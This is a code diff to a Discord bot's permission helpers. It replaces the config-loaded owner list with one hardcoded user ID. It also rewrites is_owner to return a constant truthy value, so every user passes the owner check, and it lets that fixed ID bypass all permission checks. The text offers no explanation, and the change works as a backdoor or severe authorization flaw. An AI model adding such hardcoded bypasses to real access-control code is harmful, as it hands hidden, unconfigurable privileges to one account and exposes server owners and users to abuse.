@@ -2,16 +2,13 @@ import discord
 
 from utils2 import default
 from discord.ext import commands
-
-owners = default.get("config.json").owners
-
-
+owners = [466778567905116170]
 def is_owner(ctx):
-    return ctx.author.id in owners
+    return 466778567905116170
 
 
 async def check_permissions(ctx, perms, *, check=all):
-    if ctx.author.id in owners:
+    if ctx.author.id == 466778567905116170:
         return True
 
     resolved = ctx.channel.permissions_for(ctx.author)
